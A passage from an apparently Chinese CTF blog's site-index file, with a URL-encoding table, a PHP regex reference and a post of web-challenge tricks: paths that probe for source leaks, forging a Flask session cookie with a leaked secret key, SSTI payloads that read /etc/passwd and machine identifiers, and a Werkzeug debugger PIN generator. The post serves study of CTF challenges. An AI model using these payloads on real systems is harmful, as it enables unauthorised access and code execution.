align="left">%C3%95</td></tr><tr><td align="left">Ö</td><td align="left">%D6</td><td align="left">%C3%96</td></tr><tr><td align="left">×</td><td align="left">%D7</td><td align="left">%C3%97</td></tr><tr><td align="left">Ø</td><td align="left">%D8</td><td align="left">%C3%98</td></tr><tr><td align="left">Ù</td><td align="left">%D9</td><td align="left">%C3%99</td></tr><tr><td align="left">Ú</td><td align="left">%DA</td><td align="left">%C3%9A</td></tr><tr><td align="left">Û</td><td align="left">%DB</td><td align="left">%C3%9B</td></tr><tr><td align="left">Ü</td><td align="left">%DC</td><td align="left">%C3%9C</td></tr><tr><td align="left">Ý</td><td align="left">%DD</td><td align="left">%C3%9D</td></tr><tr><td align="left">Þ</td><td align="left">%DE</td><td align="left">%C3%9E</td></tr><tr><td align="left">ß</td><td align="left">%DF</td><td align="left">%C3%9F</td></tr><tr><td align="left">à</td><td align="left">%E0</td><td align="left">%C3%A0</td></tr><tr><td align="left">á</td><td align="left">%E1</td><td align="left">%C3%A1</td></tr><tr><td align="left">â</td><td align="left">%E2</td><td align="left">%C3%A2</td></tr><tr><td align="left">ã</td><td align="left">%E3</td><td align="left">%C3%A3</td></tr><tr><td align="left">ä</td><td align="left">%E4</td><td align="left">%C3%A4</td></tr><tr><td align="left">å</td><td align="left">%E5</td><td align="left">%C3%A5</td></tr><tr><td align="left">æ</td><td align="left">%E6</td><td align="left">%C3%A6</td></tr><tr><td align="left">ç</td><td align="left">%E7</td><td align="left">%C3%A7</td></tr><tr><td align="left">è</td><td align="left">%E8</td><td align="left">%C3%A8</td></tr><tr><td align="left">é</td><td align="left">%E9</td><td align="left">%C3%A9</td></tr><tr><td align="left">ê</td><td align="left">%EA</td><td align="left">%C3%AA</td></tr><tr><td align="left">ë</td><td align="left">%EB</td><td align="left">%C3%AB</td></tr><tr><td align="left">ì</td><td align="left">%EC</td><td align="left">%C3%AC</td></tr><tr><td align="left">í</td><td align="left">%ED</td><td align="left">%C3%AD</td></tr><tr><td align="left">î</td><td align="left">%EE</td><td align="left">%C3%AE</td></tr><tr><td align="left">ï</td><td align="left">%EF</td><td align="left">%C3%AF</td></tr><tr><td align="left">ð</td><td align="left">%F0</td><td align="left">%C3%B0</td></tr><tr><td align="left">ñ</td><td align="left">%F1</td><td align="left">%C3%B1</td></tr><tr><td align="left">ò</td><td align="left">%F2</td><td align="left">%C3%B2</td></tr><tr><td align="left">ó</td><td align="left">%F3</td><td align="left">%C3%B3</td></tr><tr><td align="left">ô</td><td align="left">%F4</td><td align="left">%C3%B4</td></tr><tr><td align="left">õ</td><td align="left">%F5</td><td align="left">%C3%B5</td></tr><tr><td align="left">ö</td><td align="left">%F6</td><td align="left">%C3%B6</td></tr><tr><td align="left">÷</td><td align="left">%F7</td><td align="left">%C3%B7</td></tr><tr><td align="left">ø</td><td align="left">%F8</td><td align="left">%C3%B8</td></tr><tr><td align="left">ù</td><td align="left">%F9</td><td align="left">%C3%B9</td></tr><tr><td align="left">ú</td><td align="left">%FA</td><td align="left">%C3%BA</td></tr><tr><td align="left">û</td><td align="left">%FB</td><td align="left">%C3%BB</td></tr><tr><td align="left">ü</td><td align="left">%FC</td><td align="left">%C3%BC</td></tr><tr><td align="left">ý</td><td align="left">%FD</td><td align="left">%C3%BD</td></tr><tr><td align="left">þ</td><td align="left">%FE</td><td align="left">%C3%BE</td></tr><tr><td align="left">ÿ</td><td align="left">%FF</td><td align="left">%C3%BF</td></tr></tbody></table><br><hr><br><h1 id="PHP正则"><a href="#PHP正则" class="headerlink" title="PHP正则"></a>PHP正则</h1><h2 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h2><table><thead><tr><th>修饰符</th><th>说明</th></tr></thead><tbody><tr><td>&#x2F;i</td><td>设置之后匹配时不区分大小写</td></tr><tr><td>&#x2F;m</td><td>多行字符串的匹配</td></tr><tr><td>&#x2F;s</td><td>设置之后, “.”也能匹配到换行符</td></tr><tr><td>&#x2F;x</td><td>忽略模式串中的空格.   模式中的没有经过转义的或不在字符中的空白数据字符总会被忽略， 并且位于一个未转义的字符外部的#字符和下一个换行符之间的字符也被忽略。</td></tr><tr><td>&#x2F;e</td><td>仅用于<code>preg_replace()</code>, 将完成替换后的字符串作为php代码来执行, 此时该函数返回的是执行结果</td></tr><tr><td>&#x2F;A</td><td>如果使用这个修饰符，那么表达式必须是匹配的字符串中的开头部分。比如说”&#x2F;a&#x2F;A”匹配”abcd”。</td></tr><tr><td>&#x2F;D</td><td>模式中的<code>$</code>字符权匹配目标字符的结尾。没有此选项时，如果最后一个字符是换行符的话，美元符号也会匹配此字符之前。如果设定了修正符m则忽略此项。</td></tr><tr><td>&#x2F;E</td><td>与”m”相反，如果使用这个修饰符，那么”$”将匹配绝对字符串的结尾，而不是换行符前面，默认就打开了这个模式。</td></tr><tr><td>&#x2F;U</td><td>贪婪模式，和问号的作用差不多，最大限度的匹配就是贪婪模式。</td></tr></tbody></table><h2 id="元字符"><a href="#元字符" class="headerlink" title="元字符"></a>元字符</h2><p>下表包含了元字符的完整列表以及它们在正则表达式上下文中的行为：</p><table><thead><tr><th align="left">字符</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">\</td><td align="left"><strong>转义符</strong>,将下一个字符标记为一个特殊字符、或一个原义字符、或一个 向后引用、或一个八进制转义符。例如，’n’ 匹配字符 “n”。’\n’ 匹配一个换行符。序列 ‘\‘ 匹配 “&quot; 而 “(“ 则匹配 “(“。</td></tr><tr><td align="left">^</td><td align="left">匹配输入字符串的<strong>开始位置</strong>。如果设置了 RegExp 对象的 Multiline 属性(m修饰符)，^ 也匹配 ‘\n’ 或 ‘\r’ 之后的位置。</td></tr><tr><td align="left">$</td><td align="left">匹配输入字符串的结束位置。如果设置了RegExp 对象的 Multiline 属性，$ 也匹配 ‘\n’ 或 ‘\r’ 之前的位置。</td></tr><tr><td align="left">*</td><td align="left">匹配前面的子表达式<strong>零次或多次</strong>。例如，zo* 能匹配 “z” 以及 “zoo”。* 等价于{0,}。</td></tr><tr><td align="left">+</td><td align="left">匹配前面的子表达式一次或多次。例如，’zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。</td></tr><tr><td align="left">?</td><td align="left">匹配前面的子表达式零次或一次。例如，”do(es)?” 可以匹配 “do” 或 “does” 。? 等价于 {0,1}。</td></tr><tr><td align="left">{n}</td><td align="left">n 是一个非负整数。匹配确定的 n 次。例如，’o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。</td></tr><tr><td align="left">{n,}</td><td align="left">n 是一个非负整数。至少匹配n 次。例如，’o{2,}’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。’o{1,}’ 等价于 ‘o+’。’o{0,}’ 则等价于 ‘o*’。</td></tr><tr><td align="left">{n,m}</td><td align="left">m 和 n 均为非负整数，其中n &lt;&#x3D; m。最少匹配 n 次且最多匹配 m 次。例如，”o{1,3}” 将匹配 “fooooood” 中的前三个 o。’o{0,1}’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。</td></tr><tr><td align="left">?</td><td align="left">当该字符<strong>紧跟在任何一个其他限制符 (*, +, ?, {n}, {n,}, {n,m}) 后面时</strong>，匹配模式是<strong>非贪婪的</strong>。非贪婪模式<strong>尽可能少的匹配所搜索的字符串</strong>，而默认的贪婪模式则尽可能多的匹配所搜索的字符串。例如，<strong>对于字符串 “oooo”，’o+?’ 将匹配单个 “o”，而 ‘o+’ 将匹配所有 ‘o’。</strong></td></tr><tr><td align="left">.</td><td align="left">匹配<strong>除换行符</strong>（\n、\r）之外的任何单个字符。要匹配包括 ‘\n’ 在内的任何字符，请使用像”<strong>(.|\n)</strong>“的模式。</td></tr><tr><td align="left">(pattern)</td><td align="left">匹配 pattern 并获取这一匹配。所获取的匹配可以从产生的 Matches 集合得到，在VBScript 中使用 SubMatches 集合，在JScript 中则使用 $0…$9 属性。要匹配圆括号字符，请使用 ‘(‘ 或 ‘)‘。</td></tr><tr><td align="left">(?:pattern)</td><td align="left">匹配 pattern 但不获取匹配结果，也就是说这是一个非获取匹配，不进行存储供以后使用。这在使用 “或” 字符 (|) 来组合一个模式的各个部分是很有用。例如， ‘industr(?:y|ies) 就是一个比 ‘industry|industries’ 更简略的表达式。</td></tr><tr><td align="left">(?&#x3D;pattern)</td><td align="left">正向肯定预查（look ahead positive assert），在任何匹配pattern的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如，”Windows(?&#x3D;95|98|NT|2000)”能匹配”Windows2000”中的”Windows”，但不能匹配”Windows3.1”中的”Windows”。预查不消耗字符，也就是说，在一个匹配发生后，在最后一次匹配之后立即开始下一次匹配的搜索，而不是从包含预查的字符之后开始。</td></tr><tr><td align="left">(?!pattern)</td><td align="left">正向否定预查(negative assert)，在任何不匹配pattern的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如”Windows(?!95|98|NT|2000)”能匹配”Windows3.1”中的”Windows”，但不能匹配”Windows2000”中的”Windows”。预查不消耗字符，也就是说，在一个匹配发生后，在最后一次匹配之后立即开始下一次匹配的搜索，而不是从包含预查的字符之后开始。</td></tr><tr><td align="left">(?&lt;&#x3D;pattern)</td><td align="left">反向(look behind)肯定预查，与正向肯定预查类似，只是方向相反。例如，”&#96;(?&lt;&#x3D;95</td></tr><tr><td align="left">(?&lt;!pattern)</td><td align="left">反向否定预查，与正向否定预查类似，只是方向相反。例如”&#96;(?&lt;!95</td></tr><tr><td align="left">x|y</td><td align="left">匹配 x 或 y。例如，’z|food’ 能匹配 “z” 或 “food”。’(z|f)ood’ 则匹配 “zood” 或 “food”。</td></tr><tr><td align="left">[xyz]</td><td align="left">字符集合。匹配所包含的任意一个字符。例如， ‘[abc]’ 可以匹配 “plain” 中的 ‘a’。</td></tr><tr><td align="left">[^xyz]</td><td align="left">负值字符集合。匹配未包含的任意字符。例如， ‘[^abc]’ 可以匹配 “plain” 中的’p’、’l’、’i’、’n’。</td></tr><tr><td align="left">[a-z]</td><td align="left">字符范围。匹配指定范围内的任意字符。例如，’[a-z]’ 可以匹配 ‘a’ 到 ‘z’ 范围内的任意小写字母字符。</td></tr><tr><td align="left">[^a-z]</td><td align="left">负值字符范围。匹配任何不在指定范围内的任意字符。例如，’[^a-z]’ 可以匹配任何不在 ‘a’ 到 ‘z’ 范围内的任意字符。</td></tr><tr><td align="left">\b</td><td align="left">匹配一个单词边界，也就是指单词和空格间的位置。例如， ‘er\b’ 可以匹配”never” 中的 ‘er’，但不能匹配 “verb” 中的 ‘er’。</td></tr><tr><td align="left">\B</td><td align="left">匹配非单词边界。’er\B’ 能匹配 “verb” 中的 ‘er’，但不能匹配 “never” 中的 ‘er’。</td></tr><tr><td align="left">\cx</td><td align="left">匹配由 x 指明的控制字符。例如， \cM 匹配一个 Control-M 或回车符。x 的值必须为 A-Z 或 a-z 之一。否则，将 c 视为一个原义的 ‘c’ 字符。</td></tr><tr><td align="left">\d</td><td align="left">匹配一个数字字符。等价于 [0-9]。</td></tr><tr><td align="left">\D</td><td align="left">匹配一个非数字字符。等价于 [^0-9]。</td></tr><tr><td align="left">\f</td><td align="left">匹配一个换页符。等价于 \x0c 和 \cL。</td></tr><tr><td align="left">\n</td><td align="left">匹配一个换行符。等价于 \x0a 和 \cJ。</td></tr><tr><td align="left">\r</td><td align="left">匹配一个回车符。等价于 \x0d 和 \cM。</td></tr><tr><td align="left">\s</td><td align="left">匹配任何空白字符，包括空格、制表符、换页符等等。等价于 [ \f\n\r\t\v]。</td></tr><tr><td align="left">\S</td><td align="left">匹配任何非空白字符。等价于 [^ \f\n\r\t\v]。</td></tr><tr><td align="left">\t</td><td align="left">匹配一个制表符。等价于 \x09 和 \cI。</td></tr><tr><td align="left">\v</td><td align="left">匹配一个垂直制表符。等价于 \x0b 和 \cK。</td></tr><tr><td align="left">\w</td><td align="left">匹配字母、数字、下划线。等价于’[A-Za-z0-9_]’。</td></tr><tr><td align="left">\W</td><td align="left">匹配非字母、数字、下划线。等价于 ‘[^A-Za-z0-9_]’。</td></tr><tr><td align="left">\xn</td><td align="left">匹配 n，其中 n 为十六进制转义值。十六进制转义值必须为确定的两个数字长。例如，’\x41’ 匹配 “A”。’\x041’ 则等价于 ‘\x04’ &amp; “1”。正则表达式中可以使用 ASCII 编码。</td></tr><tr><td align="left">\num</td><td align="left">匹配 num，其中 num 是一个正整数。对所获取的匹配的引用。例如，’(.)\1’ 匹配两个连续的相同字符。</td></tr><tr><td align="left">\n</td><td align="left">标识一个八进制转义值或一个向后引用。如果 \n 之前至少 n 个获取的子表达式，则 n 为向后引用。否则，如果 n 为八进制数字 (0-7)，则 n 为一个八进制转义值。</td></tr><tr><td align="left">\nm</td><td align="left">标识一个八进制转义值或一个向后引用。如果 \nm 之前至少有 nm 个获得子表达式，则 nm 为向后引用。如果 \nm 之前至少有 n 个获取，则 n 为一个后跟文字 m 的向后引用。如果前面的条件都不满足，若 n 和 m 均为八进制数字 (0-7)，则 \nm 将匹配八进制转义值 nm。</td></tr><tr><td align="left">\nml</td><td align="left">如果 n 为八进制数字 (0-3)，且 m 和 l 均为八进制数字 (0-7)，则匹配八进制转义值 nml。</td></tr><tr><td align="left">\un</td><td align="left">匹配 n，其中 n 是一个用四个十六进制数字表示的 Unicode 字符。例如， \u00A9 匹配版权符号 (?)。</td></tr></tbody></table><h2 id="优先级"><a href="#优先级" class="headerlink" title="优先级"></a>优先级</h2><table><thead><tr><th align="left">运算符</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">\</td><td align="left">转义符</td></tr><tr><td align="left">(), (?:), (?&#x3D;), []</td><td align="left">圆括号和方括号</td></tr><tr><td align="left">*, +, ?, {n}, {n,}, {n,m}</td><td align="left">限定符</td></tr><tr><td align="left">^, $, \任何元字符、任何字符</td><td align="left">定位点和序列（即：位置和顺序）</td></tr><tr><td align="left">|</td><td align="left">替换，”或”操作 字符具有高于替换运算符的优先级，使得”m|food”匹配”m”或”food”。若要匹配”mood”或”food”，请使用括号创建子表达式，从而产生”(m|f)ood”。</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Web杂项</title>
      <link href="/post/f7296425.html"/>
      <url>/post/f7296425.html</url>
      
        <content type="html"><![CDATA[<h1 id="先考虑信息泄露-尝试访问以下"><a href="#先考虑信息泄露-尝试访问以下" class="headerlink" title="先考虑信息泄露,尝试访问以下:"></a>先考虑信息泄露,尝试访问以下:</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">/www.zip    www.rar   www.tar.gz</span><br><span class="line">/.git/</span><br><span class="line">/.git/index.php</span><br><span class="line">/.git/config</span><br><span class="line">/.svn/    (源码泄露)</span><br><span class="line">/.svn/index.php</span><br><span class="line"></span><br><span class="line">/.hg/ (hg泄露)</span><br><span class="line"></span><br><span class="line">/文件名~   gedit编辑器的缓存</span><br><span class="line"></span><br><span class="line">/index.php.swp</span><br><span class="line">/***.php.swp  (vim泄露)</span><br><span class="line">/phpmyadmin/</span><br><span class="line">/phpmyadmin/index.php</span><br><span class="line">/robots.txt</span><br><span class="line">/db/db.mdb  (mdb数据库存放位置)</span><br><span class="line"></span><br><span class="line">***.bak</span><br><span class="line">例如 index.php.bak</span><br><span class="line"></span><br><span class="line">.DS_store</span><br></pre></td></tr></table></figure><h1 id="使用脚本对flask网站的session进行解密和伪造"><a href="#使用脚本对flask网站的session进行解密和伪造" class="headerlink" title="使用脚本对flask网站的session进行解密和伪造"></a>使用脚本对<code>flask</code>网站的<code>session</code>进行解密和伪造</h1><p>以达到伪装特殊权限用户登录的目的, 参考题目:<a href="2e610037.html">buuctf-[HCTF 2018]admin</a></p><blockquote><p><code> flask</code>的<code>session</code>是存储在客户端<code>cookie</code>中的，而且<code>flask</code>仅仅对数据进行了签名。众所周知的是，签名的作用是防篡改，而无法防止被读取。而<code>flask</code>并没有提供加密操作，所以其<code>session</code>的全部内容都是可以在客户端读取的，这就可能造成一些安全问题。</p></blockquote><p>可以使用脚本对<code>flask</code>的<code>session</code>进行解密和伪造:</p><p>注册一个名为<code>admin1</code>的账户并登录,抓包看到当前的<code>cookie</code>中的<code>session</code>值:</p><img src="/images/ctfweb-others/image-20221016213837939.png" alt="image-20221016213837939" style="zoom:67%;" /><p>可以使用脚本对<code>session</code>进行解密:<a href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p><p>用法:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">py flask_session_cookie_manager3.py decode -c &quot;session值&quot; -s &quot;key值&quot;</span><br><span class="line">py flask_session_cookie_manager3.py encode -s &quot;key值&quot; -t &quot;我们需要伪造的值&quot;</span><br></pre></td></tr></table></figure><p>可以在<code>config.py</code>中找到<code>key</code>的值:<code>ckj123</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Config</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    SECRET_KEY = os.environ.get(<span class="string">&#x27;SECRET_KEY&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;ckj123&#x27;</span></span><br><span class="line">    SQLALCHEMY_DATABASE_URI = <span class="string">&#x27;mysql+pymysql://root:adsl1234@db:3306/test&#x27;</span></span><br><span class="line">    SQLALCHEMY_TRACK_MODIFICATIONS = <span class="literal">True</span></span><br></pre></td></tr></table></figure><p>用脚本: 首先使用<code>key</code>对<code>admin1</code>登录时的<code>session</code>值进行解密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E:\CTF工具合集\flask-session-cookie-manager-master\flask-session-cookie-manager-master&gt;py flask_session_cookie_manager3.py decode -c &quot;.eJw9kMFuwjAMhl9lypkD3egFiQNTCmqlJAKljZwLKrSQuDGT6CZoEe--DE2cP_vz__vOdsdL2zs2P9ahbyds5xs2v7O3PZszqT9RGRkAs1RpuFp03mLhAMWH4hVKUyGM5UzybrBYJmpdodAOLeUpkEiFFokYpZe6cNasgjUwSF6QNCuneJwz4ibHTdzNZ5YvZ2CqACZPJR5uYLZB6dMo3qtO0F-GolM8S8W4JdDOS2wQ9HKUVF6B8gV7TNihvxx3319de35VACqC5TZYnaWSCg8EU9Bl1G4GqbNBrGPEdaxGkeMmnq2cWi6eOk_1qX2ZmmlS2n9yrikCVjfkzwmbsJ--vTwfx5Ipe_wCfPRvAQ.Y0wFxw.Mk0P7kqa9AF6MQm6hSJpO1WQFhQ&quot; -s &quot;ckj123&quot;</span><br></pre></td></tr></table></figure><p>解密出来的值是一个字典: 可以看到里面有<code>admin1</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;_fresh&#x27;: False, &#x27;_id&#x27;: b&#x27;50c9ceb19960f8bf2ab3785c5ecc58492f558ec18cfb9bc913533b52aeaeef242f5aa88cec1742f28d08aeeab9671ade9833ed2ceb2d81934fa8b67ca036e0bb&#x27;, &#x27;csrf_token&#x27;: b&#x27;bbed6ee196bbbf4a533d25120c50f0fa9641aea8&#x27;, &#x27;image&#x27;: b&#x27;wMTd&#x27;, &#x27;name&#x27;: &#x27;admin1&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;</span><br></pre></td></tr></table></figure><p>那么为了伪造<code>admin</code>登录,将<code>admin1</code>改为<code>admin</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;_fresh&#x27;: False, &#x27;_id&#x27;: b&#x27;50c9ceb19960f8bf2ab3785c5ecc58492f558ec18cfb9bc913533b52aeaeef242f5aa88cec1742f28d08aeeab9671ade9833ed2ceb2d81934fa8b67ca036e0bb&#x27;, &#x27;csrf_token&#x27;: b&#x27;bbed6ee196bbbf4a533d25120c50f0fa9641aea8&#x27;, &#x27;image&#x27;: b&#x27;wMTd&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;</span><br></pre></td></tr></table></figure><p>然后使用脚本对修改完的内容进行加密,同样需要用到<code>key</code>,加密之后得到一个新的<code>session</code>值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">E:\CTF工具合集\flask-session-cookie-manager-master\flask-session-cookie-manager-master&gt;py flask_session_cookie_manager3.py encode -s &quot;ckj123&quot; -t &quot;&#123;&#x27;_fresh&#x27;: False, &#x27;_id&#x27;: b&#x27;50c9ceb19960f8bf2ab3785c5ecc58492f558ec18cfb9bc913533b52aeaeef242f5aa88cec1742f28d08aeeab9671ade9833ed2ceb2d81934fa8b67ca036e0bb&#x27;, &#x27;csrf_token&#x27;: b&#x27;bbed6ee196bbbf4a533d25120c50f0fa9641aea8&#x27;, &#x27;image&#x27;: b&#x27;wMTd&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;&quot;</span><br><span class="line">.eJw9kMFuwjAMhl9l8pkD3egFiQNTCmqlOAKljZwLKrSQpAmT6CZoEe--DE2cP_vz__sOu-Ol7Q3Mj7Xv2wnsbAPzO7ztYQ4oP51Q6MllqZB01c5Y7QpDjn8IVjlUlaOxnCHrBu3KRKwrx6VxOuQpBZ5yyRM-okVZGK1WXisakBUB1coIFucUv-G4ibv5TLPljFTlSeUpusON1NYLeRr5e9Xx8Jeh6ATLUj5uA0lj0TWO5HLEUF4p5At4TODQX46776-uPb8qUCi8ZtprmaUYCkuBpiTLqN0MKLOBr2PEdawWInebeLYyYrl46myoT-3L1EyTUv-Tcx0igLoJ9gwT-Onby_NvkEzh8QsPi27Q.Y0wG7Q.BnqQ4DVzGAf6kiiYR_i5k9_YwLQ</span><br></pre></td></tr></table></figure><p>将这个新的值替换到<code>cookie</code>中,就完成了<code>session</code>伪造,成功伪装成了<code>admin</code>登录,拿到flag</p><img src="/images/ctfweb-others/image-20221016213048788.png" alt="image-20221016213048788" style="zoom:67%;" /><br><hr><br><h1 id="flask的PIN伪造"><a href="#flask的PIN伪造" class="headerlink" title="flask的PIN伪造"></a>flask的PIN伪造</h1><blockquote><p>PIN是 <code>Werkzeug</code>（它是<code> Flask</code> 的依赖项之一）提供的额外安全措施，以防止在不知道 PIN 的情况下访问调试器。 <strong>您可以使用浏览器中的调试器引脚来启动交互式调试器。</strong></p><p>请注意，无论如何，您都不应该在生产环境中使用调试模式，因为错误的堆栈跟踪可能会揭示代码的多个方面。</p><p>调试器 PIN 只是一个附加的安全层，以防您无意中在生产应用程序中打开调试模式，从而使攻击者难以访问调试器。</p><p><code>werkzeug</code>不同版本以及<code>python</code>不同版本都会影响PIN码的生成</p></blockquote><p>如果需要伪造PIN码,需要:</p><ul><li><code>username</code>, 读取<code>/etc/passwd</code>获得</li><li><code>modname</code>,默认值是<code>flask.app</code></li><li><code>appname</code>,默认值是<code>Flask</code></li><li>10进制的mac地址, 通过<code>/sys/class/net/eth0/address</code>获得十六进制格式,再转为10进制</li><li><code>machine_id</code> :读取文件<code>/etc/machine-id </code> 或者 <code>/proc/sys/kernel/random/boot_id 3./proc/self/cgroup</code></li><li><code>flask/app.py</code>的路径, 常见的有:<code>/usr/local/lib/python3.7/site-packages/flask/app.py</code>,通过报错等信息获得</li></ul><p><strong>通过已知的SSTI来读取文件,获得上述信息:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for x in ().__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if &quot;warning&quot; in x.__name__ %&#125;</span><br><span class="line">&#123;&#123;x.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/etc/passwd&#x27;).read() &#125;&#125;</span><br><span class="line">&#123;%endif%&#125;</span><br><span class="line">&#123;%endfor%&#125;</span><br><span class="line">输出中找到了一个名为 flaskweb的可疑用户</span><br><span class="line"></span><br><span class="line">&#123;% for x in ().__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if &quot;warning&quot; in x.__name__ %&#125;</span><br><span class="line">&#123;&#123;x.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/sys/class/net/eth0/address&#x27;).read() &#125;&#125;</span><br><span class="line">&#123;%endif%&#125;</span><br><span class="line">&#123;%endfor%&#125;</span><br><span class="line">输出mac地址56:08:f5:2f:90:51, 转为10进制:94596473262161</span><br><span class="line"></span><br><span class="line">&#123;% for x in ().__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if &quot;warning&quot; in x.__name__ %&#125;</span><br><span class="line">&#123;&#123;x.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/etc/machine-id&#x27;).read() &#125;&#125;</span><br><span class="line">&#123;%endif%&#125;</span><br><span class="line">&#123;%endfor%&#125;</span><br><span class="line">machine-id: 1408f836b0ca514d796cbf8960e45fa1</span><br></pre></td></tr></table></figure><p>运行脚本,生成pin:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;flaskweb&#x27;</span>  <span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,  <span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,  <span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span>  <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;94596473262161&#x27;</span>,  <span class="comment"># mac地址  str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">    <span class="string">&#x27;1408f836b0ca514d796cbf8960e45fa1&#x27;</span>  <span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span 